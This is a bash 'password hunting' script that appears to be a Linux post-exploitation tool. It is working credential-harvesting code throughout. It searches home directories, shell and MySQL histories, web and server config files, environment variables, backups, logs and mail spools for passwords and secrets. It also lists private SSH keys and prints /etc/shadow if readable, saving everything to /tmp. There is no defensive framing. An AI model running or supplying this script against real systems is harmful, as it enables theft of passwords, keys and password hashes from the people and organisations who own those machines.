#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        PASSWORD HUNTING SCRIPT          ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

output_dir="/tmp/password_hunt_$$"
mkdir -p "$output_dir"

echo -e "\n${BLUE}[+] Searching for password patterns in home directories${NC}"
grep -ri "password" /home/ 2>/dev/null > "$output_dir/passwords_home.txt"
grep -ri "passwd" /home/ 2>/dev/null > "$output_dir/passwd_home.txt"
grep -ri "secret" /home/ 2>/dev/null > "$output_dir/secret_home.txt"

echo -e "${GREEN}Found $(wc -l < "$output_dir/passwords_home.txt") potential password matches in /home${NC}"
echo -e "${YELLOW}Top 10 results:${NC}"
head -10 "$output_dir/passwords_home.txt"

echo -e "\n${BLUE}[+] Checking user command history${NC}"
for user_dir in /home/*; do
    if [ -d "$user_dir" ]; then
        user=$(basename "$user_dir")
        echo -e "\n${YELLOW}History for user: $user${NC}"
        
        if [ -f "$user_dir/.bash_history" ]; then
            echo -e "${GREEN}.bash_history found${NC}"
            grep -i "password\|passwd\|su\|sudo\|ssh" "$user_dir/.bash_history" 2>/dev/null | tail -10
        fi
        
        if [ -f "$user_dir/.zsh_history" ]; then
            echo -e "${GREEN}.zsh_history found${NC}"
            grep -i "password\|passwd\|su\|sudo\|ssh" "$user_dir/.zsh_history" 2>/dev/null | tail -10
        fi
        
        if [ -f "$user_dir/.mysql_history" ]; then
            echo -e "${GREEN}.mysql_history found${NC}"
            cat "$user_dir/.mysql_history" 2>/dev/null | head -10
        fi
    fi
done

echo -e "\n${BLUE}[+] Checking common config files for credentials${NC}"
config_files=(
    "/etc/hosts"
    "/etc/hostname"
    "/etc/network/interfaces"
    "/etc/apache2/apache2.conf"
    "/etc/nginx/nginx.conf"
    "/etc/ssh/sshd_config"
    "/etc/mysql/my.cnf"
    "/etc/php/7.*/apache2/php.ini"
    "/var/www/html/wp-config.php"
    "/var/www/html/config.php"
    "/var/www/html/configuration.php"
    "/opt/*.conf"
)

for conf_file in "${config_files[@]}"; do
    if [ -f "$conf_file" ] || ls $conf_file &>/dev/null; then
        echo -e "\n${GREEN}Checking: $conf_file${NC}"
        if grep -qi "password\|passwd\|username\|user.*=" "$conf_file" 2>/dev/null; then
            grep -i "password\|passwd\|username\|user.*=" "$conf_file" 2>/dev/null
        fi
    fi
done

echo -e "\n${BLUE}[+] Searching for SSH keys${NC}"
find /home -name "id_rsa*" -o -name "id_dsa*" -o -name "id_ed25519*" 2>/dev/null > "$output_dir/ssh_private_keys.txt"
find /home -name "authorized_keys" -o -name "known_hosts" 2>/dev/null > "$output_dir/ssh_public_keys.txt"

echo -e "${GREEN}Private SSH keys:${NC}"
cat "$output_dir/ssh_private_keys.txt"

echo -e "\n${BLUE}[+] Checking for web application configs${NC}"
web_paths=(
    "/var/www"
    "/var/html"
    "/srv/www"
    "/usr/share/nginx/html"
)

for path in "${web_paths[@]}"; do
    if [ -d "$path" ]; then
        echo -e "${YELLOW}Scanning $path...${NC}"
        find "$path" -name "*.conf" -o -name "config*.php" -o -name "wp-config.php" 2>/dev/null | head -20
    fi
done

echo -e "\n${BLUE}[+] Checking for database connection strings${NC}"
grep -ri "mysql://\|postgres://\|mongodb://\|sqlite://" /home/ /var/www/ /opt/ 2>/dev/null | head -20

echo -e "\n${BLUE}[+] Checking for environment variables${NC}"
env | grep -i "password\|secret\|key\|token" > "$output_dir/env_secrets.txt"
if [ -s "$output_dir/env_secrets.txt" ]; then
    echo -e "${GREEN}Found secrets in environment:${NC}"
    cat "$output_dir/env_secrets.txt"
fi

echo -e "\n${BLUE}[+] Checking for backup files${NC}"
find /home /var/www /opt -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "~" 2>/dev/null > "$output_dir/backup_files.txt"
echo -e "${GREEN}Found $(wc -l < "$output_dir/backup_files.txt") backup files${NC}"
head -10 "$output_dir/backup_files.txt"

echo -e "\n${BLUE}[+] Checking for log files with credentials${NC}"
log_files=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/secure"
    "/var/log/messages"
    "/var/log/apache2/error.log"
    "/var/log/nginx/error.log"
)

for log_file in "${log_files[@]}"; do
    if [ -f "$log_file" ]; then
        echo -e "${YELLOW}Checking $log_file${NC}"
        grep -i "password\|failed.*login\|root" "$log_file" 2>/dev/null | tail -10
    fi
done

echo -e "\n${BLUE}[+] Checking for stored passwords in mail${NC}"
find /var/mail /var/spool/mail -type f 2>/dev/null > "$output_dir/mail_files.txt"
while IFS= read -r mail_file; do
    if [ -f "$mail_file" ]; then
        echo -e "${GREEN}Mail file: $mail_file${NC}"
        grep -i "password" "$mail_file" 2>/dev/null | head -5
    fi
done < "$output_dir/mail_files.txt"

echo -e "\n${BLUE}[+] Checking for readable /etc/shadow${NC}"
if [ -r "/etc/shadow" ]; then
    echo -e "${RED}[!] /etc/shadow is readable!${NC}"
    head -5 /etc/shadow
else
    echo -e "${GREEN}[+] /etc/shadow is not readable${NC}"
fi

echo -e "\n${BLUE}[+] Checking for world-readable files in /etc${NC}"
find /etc -maxdepth 1 -readable -type f 2>/dev/null > "$output_dir/etc_readable.txt"
cat "$output_dir/etc_readable.txt"

echo -e "\n${GREEN}[+] Password hunting complete!${NC}"
echo -e "${YELLOW}Results saved to: $output_dir${NC}"
echo -e "${YELLOW}Files generated:${NC}"
ls -lh "$output_dir"
